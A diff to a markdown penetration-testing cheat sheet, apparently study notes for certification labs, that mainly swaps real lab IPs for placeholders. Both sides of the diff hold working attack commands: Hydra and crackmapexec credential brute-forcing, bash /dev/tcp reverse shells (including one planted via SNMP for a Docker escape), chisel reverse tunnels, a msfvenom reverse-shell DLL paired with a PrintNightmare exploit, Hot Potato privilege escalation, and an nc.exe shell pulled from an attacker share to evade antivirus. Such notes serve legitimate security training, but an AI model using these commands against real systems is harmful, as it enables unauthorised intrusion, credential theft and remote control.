@@ -162,7 +162,7 @@ Examples of usage:
 
 **Mutating wordlists**
 
-When password policies are implemented, it is helpful to remove password policies that are guaranteed to fail from the worlist. Starting from a wordlist called `demo.txt`
+When password policies are implemented, it is helpful to remove password policies that are guaranteed to fail from the wordlist. Starting from a wordlist called `demo.txt`
 - `sed -i '/^1/d' demo.txt` remove all number sequences
 
 Many people just append a "1" to the end of an existing password when creating a password with a number value. Create a rule file with $1 that adds a "1" to each password in our wordlist.
@@ -288,10 +288,10 @@ Other rules
   - `hydra -L users.txt -P pass.txt telnet://target.server` Telnet example
   - `hydra -L users.txt -P pass.txt http-get://target.server` Password protected web resource
   - Specify a port with `-s <PORT>` in <options>
-- `hydra -L usernames.txt -P passwords.txt 192.168.244.140 smtp -e nsr`
-- `hydra -L usernames.txt -P usernames.txt 192.168.182.216 ssh -e nsr`
-- `sudo hydra -L usernames.txt -P passwords.txt 192.168.157.21 smb2 -e nsr`
-- `hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.190.208:7080/login.php/session:userid=^USER64^&pass=^PASS64^:C=/:F=403' -e nsr`
+- `hydra -L usernames.txt -P passwords.txt <TARGET_IP> smtp -e nsr`
+- `hydra -L usernames.txt -P usernames.txt <TARGET_IP> ssh -e nsr`
+- `sudo hydra -L usernames.txt -P passwords.txt <TARGET_IP> smb2 -e nsr`
+- `hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://<TARGET_IP>:<PORT>/login.php/session:userid=^USER64^&pass=^PASS64^:C=/:F=403' -e nsr`
 
 SSH Attack
 - `sudo hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
@@ -323,18 +323,18 @@ HTTP POST Attack
 
 ### Custom wordlists
 - Cewl
-  - (at first, use just this list) `cewl http://192.168.134.126/ --with-numbers -w custom-wordlist.txt`
-  - `cewl -d 5 -m 3 http://192.168.220.115/ -w custom-wordlist.txt`
-  - `cewl --lowercase http://192.168.13444.126/ | grep -v CeWL >> custom-wordlist.txt`
+  - (at first, use just this list) `cewl http://<TARGET_IP>/ --with-numbers -w custom-wordlist.txt`
+  - `cewl -d 5 -m 3 http://<TARGET_IP>/ -w custom-wordlist.txt`
+  - `cewl --lowercase http://<TARGET_IP>/ | grep -v CeWL >> custom-wordlist.txt`
   - `sort custom-wordlist.txt | uniq -u > final-wordlist.txt`
 - generate usernames
   - `python2 ~/Documents/scripts/usernamer.py -f full_names.txt`
 - `cupp -i`
 
 ### More attacks
-- `crackmapexec ssh 192.168.220.240 -u usernames.txt -p passwords.txt --continue-on-success`
+- `crackmapexec ssh <TARGET_IP> -u usernames.txt -p passwords.txt --continue-on-success`
 - AES-256-CBC-PKCS7: https://github.com/mpgn/Padding-oracle-attack
-  - `python3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.229.119:2290 -u '/?c=' --error '<span id="MyLabel">0</span>'`
+  - `python3 exploit.py -c <CIPHER_TEXT> -l 16 --host <TARGET_IP>:<PORT> -u '/?c=' --error '<span id="MyLabel">0</span>'`
 
 ### Leveraging Password Hashes
 
@@ -510,7 +510,6 @@ The first time plink connects to a host, it will attempt to cache the host key i
 ### Chisel
 
 - https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
-- https://ap3x.github.io/posts/pivoting-with-chisel/
 - https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
 - https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
 - To have the process in the background, use `&` at the end of the command
@@ -518,8 +517,8 @@ The first time plink connects to a host, it will attempt to cache the host key i
 **Port forwarding with chisel**: https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
 ```
 ./chisel server -p 9999 --reverse
-./chisel client 192.168.45.193:9999 R:8000:socks                <# dynamic port forwarding #>
-./chisel.exe client 192.168.45.193:9999 R:8090:localhost:80     <# port forwarding port 80 
+./chisel client <ATTACKER_IP>:9999 R:8000:socks                <# dynamic port forwarding #>
+./chisel.exe client <ATTACKER_IP>:9999 R:8090:localhost:80     <# port forwarding port 80 
                                                                      connect then to localhost:8090 
                                                                      usefull for /phpmyadmin/ #>
 ```
@@ -708,7 +707,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 **Bash**
 ```bash
 #!/bin/bash
-/usr/bin/bash -i >& /dev/tcp/192.168.45.226/445 0>&1
+/usr/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
 ```
 
 
@@ -786,7 +785,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 - `env` inspect environment variables
   - `/etc/environment`
-- `cat .bashr` ispect .bashrc
+- `cat .bashrc` inspect .bashrc
 - `watch -n 1 "ps -aux | grep pass"` harvest active processes for credentials
 - `sudo tcpdump -i lo -A | grep "pass"` perform password sniffing
 - `history`
@@ -1061,15 +1060,15 @@ Docker Container Escape via SNMP
      - Found NET-SNMP-EXTEND-MIB tables (`nsExtendConfigTable`, `nsExtendOutput1Table` and `nsExtendOutput2Table`) > this means RCE
   2. `sudo download-mibs`
   3. `set mibs +ALL in /etc/snmp/snmp.conf`
-  4. `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`
+  4. `snmpwalk -v2c -c <COMMUNITY_STRING> <TARGET_IP> nsExtendOutput1`
      - notice if the query works
 - docker escape
    1. VICTIM:
       ```
-      echo 'bash -c "bash -i >& /dev/tcp/192.168.45.216/4444 0>&1"' > /tmp/shtest
+      echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"' > /tmp/shtest
       chmod +x /tmp/shtest
       ```
-   3. ATTACKER: `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`
+   3. ATTACKER: `snmpwalk -v2c -c <COMMUNITY_STRING> <TARGET_IP> nsExtendOutput1`
 
 ### User groups
 - If your user is part of the group `disk`:
@@ -1114,7 +1113,6 @@ See [Information gathering | Windows](#windows). Always obtain:
 - [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
 - [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)
 - [MinGW-w64](https://www.mingw-w64.org/)
-- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
 - [Windows persistence](#windows-persistence)
 - Scripts
   - [Windows Privilege Escalation Awesome Scripts](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
@@ -1427,7 +1425,6 @@ Create a PowerShell remoting session via WinRM
 3. `Enter-PSSession -ComputerName <computer_name> -Credential $cred`
 
 Check also:
-- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
 - [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
   - `evil-winrm -i <IP> -u <username> -p <password>`
 - [powershell_reverse_shell.ps1](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
@@ -1700,7 +1697,7 @@ Also called "Service Binary Hijacking". Exploit insecure file permissions on ser
 Note: This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.
 1. See [Hot Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#hotPotato), get the exploit [here](https://github.com/foxglovesec/Potato)
 2. Start a listener on the attacker machine
-3. Run the exploit: `.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
+3. Run the exploit: `.\potato.exe -ip <TARGET_IP> -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
 4. Wait for a Windows Defender update (or trigger one manually)
 
 ### Token Impersonation
@@ -1779,17 +1776,17 @@ maybe you are in a directory where there is something strange
 
 
 ### PrintNightmare
-- `impacket-rpcdump @10.10.108.190 | egrep 'MS-RPRN|MS-PAR'`. See: https://github.com/cube0x0/CVE-2021-1675#scanning
-    1. `msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=10.18.110.121 LPORT=447 -f dll > shell.dll`
+- `impacket-rpcdump @<TARGET_IP> | egrep 'MS-RPRN|MS-PAR'`. See: https://github.com/cube0x0/CVE-2021-1675#scanning
+    1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > shell.dll`
     2. `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
     4. Set a listener: `msfconsole -q`, `use multi/handler`
-    3. `python3 '/home/kali/Documents/windows-attack/CVE/PrintNightmare/CVE-2021-1675/CVE-2021-1675.py' VULNNET/enterprise-security:'sand_0873959498'@10.10.198.52 '\\10.18.110.121\share\shell.dll'`
+    3. `python3 CVE-2021-1675.py <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP> '\\<ATTACKER_IP>\share\shell.dll'`
   - For just a Priv Esc, use https://github.com/calebstewart/CVE-2021-1675
 - See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare
 
 
 ### Bypass CLM / CLM breakout | CLM / AppLocker Break Out
-- Verify that you are in a contained enviorment with
+- Verify that you are in a contained environment with
   - `$executioncontext.sessionstate.languagemode`
   - `Get-AppLockerPolicy -Effective -XML`
 - [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM)
@@ -1872,7 +1869,7 @@ You can run system commands. There are many ways to do it:
 ## Buffer Overflow
 
 **Tools**
-- [Immunity Debugger](https://www.immunityinc.com/products/debugger/) + [mona](https://github.com/corelan/mona)
+- [mona](https://github.com/corelan/mona)
 - [Vulnserver](https://thegreycorner.com/vulnserver.html)
   - Note: usually, `<port vulnserver>` is `9999`
 - [Kali](https://www.kali.org/)
@@ -2073,7 +2070,7 @@ On Immunity, using mona, type
 
 - With powershell, use `-e` or `-enc` with an encoded command in base64
 - See more here: [Section 14: Antivirus Bypassing](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-14-antivirus-bypassing)
-- Try not running exe on disk, for example `cmd /c \\192.168.45.182\Share\nc.exe -i cmd.exe 192.168.45.182 448`
+- Try not running exe on disk, for example `cmd /c \\<ATTACKER_IP>\Share\nc.exe -e cmd.exe <ATTACKER_IP> <PORT>`
 
 ### ToDo
 - Discover the AV in the machine of the victim
